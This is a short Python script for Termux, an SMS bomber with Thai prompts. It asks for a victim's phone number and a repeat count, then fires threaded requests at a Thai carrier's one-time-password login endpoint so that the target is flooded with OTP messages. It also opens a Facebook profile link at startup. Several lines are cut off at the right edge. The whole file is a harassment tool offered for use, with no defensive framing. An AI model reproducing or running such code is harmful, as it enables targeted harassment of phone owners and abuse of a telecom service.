import requests,json
import random
import os
import time
import threading
from requests import get
from re import search
from requests import Session
from threading import Thread






os.system('clear')
os.system("termux-open-url https://www.facebook.com/profile.php?id=1000445522>
phone = input("\033[1;92m📱เบอร์โทรศัพท์ : \033[1;96m")
jam = int(input("\033[1;92m📲จำนวน : \033[1;96m"))
print("")

def sms():
        session = Session()
        ReqTOKEN = session.get("https://srfng.ais.co.th/Lt6YyRR2Vvz%2B%2F6MNG>
        session.post("https://srfng.ais.co.th/login/sendOneTimePW", data=f"ms>
        print(f"📩เริ่มยิงไปที่เบอร์ {phone} จำนวน {jam}")

for i in range(jam):
        time.sleep(1)
        threading.Thread(target=sms).start()
